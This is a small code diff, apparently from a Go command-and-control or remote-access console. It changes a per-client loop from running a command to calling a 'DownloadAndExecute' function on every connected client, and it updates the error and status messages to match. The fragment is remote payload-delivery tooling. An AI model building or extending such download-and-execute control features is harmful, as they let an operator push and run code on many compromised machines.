@@ -151,11 +151,11 @@ var commandList = []command{
 			}
 			for _, cl := range clients {
 				
-				_, resp, err := cl.RunCommand(args[1], args[2:], true)
+				err := cl.DownloadAndExecute(args[1], args[2:])
 				if err != nil {
 					c.Printf(c.au.Red(fmt.Sprintf("Error downloading and executing on %s: %s", cl, err)).String())
 				}
-				c.Printf("%s", resp)
+				c.Printf("Downloaded and executed on client ID %d", cl.ID)
 			}
 			return ""
 		},
